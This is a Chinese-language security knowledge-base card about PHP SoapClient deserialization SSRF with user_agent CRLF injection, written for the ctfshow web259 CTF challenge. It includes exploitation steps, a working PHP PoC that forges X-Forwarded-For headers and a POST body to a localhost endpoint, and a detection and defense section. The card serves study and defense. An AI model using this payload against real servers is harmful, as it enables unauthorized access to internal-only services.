---
id: web-php-native-class-soapclient-call-ssrf-crlf
title: PHP 原生类 SoapClient SSRF：反序列化后调用不存在方法触发 __call，user_agent 换行伪造内网请求
type: scenario
domain: web
path: web/php/deserialization
technique: php-soapclient-native-class-call-ssrf-crlf
tags:
- php
- soapclient
- ssrf
- crlf
- native-class
- deserialization
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V534
  verified_at: '2026-11-11T17:21:26+08:00'
  notes: 已对照原文全文与16张截图逐张核对：原文 SoapClient 章节给出 __call 触发方式（访问不存在方法）、构造函数 location/uri/user_agent 三参数、CRLF 注入与 ctfshow web259 的 XFF 两次 array_pop 逻辑，卡片原理/PoC/步骤与之一致。affected_versions：原文未写受影响 PHP 版本，保持为空。dedup_review 核对成立：现有 web-php-deserialization-session-soapclient-crlf-ssrf 的入口是 session.serialize_handler 不一致注入，目标是往攻击者 session 写 flag；本卡入口是直接 unserialize 用户参数后调用不存在方法，目标是 ctfshow web259 的 XFF 校验加 token 写 flag.txt，触发条件/PoC/环境不同，保留为并列场景不删除。
url: /docs/web/php/deserialization/web-php-native-class-soapclient-call-ssrf-crlf/
draft: false
kb_aliases:
- SoapClient SSRF
- SoapClient __call
- user_agent CRLF 注入
- SoapClient 伪造 X-Forwarded-For
- ctfshow web259
- PHP 原生类 SSRF
---

## 一句话结论

PHP 的 `SoapClient` 在非 WSDL 模式下只要设置 `location` 与 `uri`，之后调用任意不存在的方法就会触发 `__call` 并发起 SOAP HTTP 请求；把该对象序列化后传入 `unserialize`，应用随后调用一个不存在的方法（如 `$vip->getFlag()`），即可让服务端向攻击者指定的 `location`（包括 127.0.0.1 内网接口）发请求；`user_agent` 中的 `\r\n` 可以注入任意请求头与请求体，从而伪造 `X-Forwarded-For`、Cookie 等，绕过后端仅允许本机访问的限制。

## 原理

- `SoapClient::__construct(?string $wsdl, array $options)`：`wsdl` 为 `null` 时进入非 WSDL 模式，必须在 `options` 中提供 `location`（请求目标 URL）与 `uri`（SOAP 命名空间）。
- 当代码调用 SoapClient 对象上不存在的方法时，PHP 触发 `__call`，SoapClient 按 SOAP 协议向 `location` 发起 POST 请求，请求头里包含 `User-Agent`、`SOAPAction`、`Content-Type` 等。
- `options['user_agent']` 被原样拼进请求头。攻击者在其中放入 `\r\n` 即可提前结束当前头部行并注入新的请求头；再配合 `Content-Length` 与一个空行，可以注入任意请求体，使后续 SOAP XML 被截断丢弃。
- 因此可以在服务端进程（通常从 127.0.0.1 或内网地址发起）上伪造 `X-Forwarded-For: 127.0.0.1`、`Cookie` 或任意 POST body，访问仅限本机的接口。
- 该对象可以直接被 `serialize()`/`unserialize()`；攻击者只需控制反序列化入口和后续一次不存在方法调用，就能把 SSRF 原语接进目标业务。
- 与 session 处理器不一致注入 SoapClient 的链不同，这里不需要 session 反序列化，直接的 `unserialize($_GET['x'])` + 调用不存在方法即可触发。

## 触发条件

- 应用存在用户可控的 `unserialize()`，且反序列化后的对象会被调用一个不存在的方法（`__call` 触发点），或直接把对象当字符串/可调用值处理。
- 目标 PHP 启用 Soap 扩展；攻击者可控 `location`/`uri`/`user_agent`。
- 目标可从自身网络访问 `location` 指向的地址（本机 127.0.0.1、内网服务）。
- 后端接口的安全判断依赖可伪造的头（X-Forwarded-For、Client-IP、Cookie 等）或只校验来源 IP。

## 利用步骤

1. 确认入口：`unserialize($_GET['vip'])` 后存在 `$vip->某不存在方法()` 之类的调用。
2. 构造 SoapClient：`new SoapClient(null, ['location'=>'http://127.0.0.1/flag.php','uri'=>'http://127.0.0.1/','user_agent'=>...])`。
3. 在 `user_agent` 中写入 `\r\n` 注入 `X-Forwarded-For: 127.0.0.1`、`Content-Type: application/x-www-form-urlencoded`、正确的 `Content-Length`，再接两个换行和伪造的 POST body（如 `token=ctfshow`）。
4. `serialize()` 后 URL 编码，作为入口参数提交；应用调用不存在方法触发 `__call`，服务端向 `location` 发起伪造请求。
5. 检查目标接口的副作用（写文件、写 session、改配置）；若接口需要多次 array_pop 取 XFF，按后端逻辑调整 XFF 值的个数（如 `x,y,z` 两次 array_pop 后取 `y`）。
6. 若 `location` 为外部地址，可直接观察攻击者服务器收到的请求，确认 SSRF。

## PoC

```php
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$ua = "test\r\n" .
      "X-Forwarded-For: 127.0.0.1,127.0.0.1\r\n" .
      "Content-Type: application/x-www-form-urlencoded\r\n" .
      "Content-Length: 13\r\n\r\n" .
      "token=ctfshow";
$b = new SoapClient(null, array(
    'location' => $target,
    'user_agent' => $ua,
    'uri' => 'http://127.0.0.1/'
));
echo urlencode(serialize($b));
```

入口：

```php
$vip = unserialize($_GET['vip']);
$vip->getFlag();   // 不存在的方法，触发 __call → SOAP 请求
```

请求头分隔规则：头与头之间一个 `\r\n`，头与 body 之间两个 `\r\n`；`Content-Length` 必须与实际注入的 body 长度一致，否则后续 SOAP 报文可能被拼进 body。

## 变体与关联

- 变体：不注入 body，只用 `user_agent` 注入 `Cookie`/`X-Forwarded-For` 做来源伪造；或用 `_cookies`、`_proxy_host` 等私有属性控制请求。
- 关联：session 处理器不一致注入 SoapClient 的入口见 `web-php-deserialization-session-soapclient-crlf-ssrf`；本卡是同一原语在“直接反序列化 + 不存在方法调用”场景下的用法。
- 关联：SSRF 通用绕过与内网探测见 `web/generic/ssrf`。

## 检测与防御

- 不对不可信输入做 `unserialize`；使用 JSON 等无对象反序列化格式，或 `unserialize(..., ['allowed_classes'=>false])`。
- 禁用不必要的 Soap 扩展/SoapClient 类，或对反序列化类做白名单。
- 后端不要信任 X-Forwarded-For/Client-IP 等可伪造头，改为在可信代理层覆盖并校验。
- 检测：请求体出现 `O:10:"SoapClient"`；服务端出现异常 SOAP 请求、请求头中出现 `\r\n` 注入痕迹；本机接口收到带伪造 XFF 的 POST。
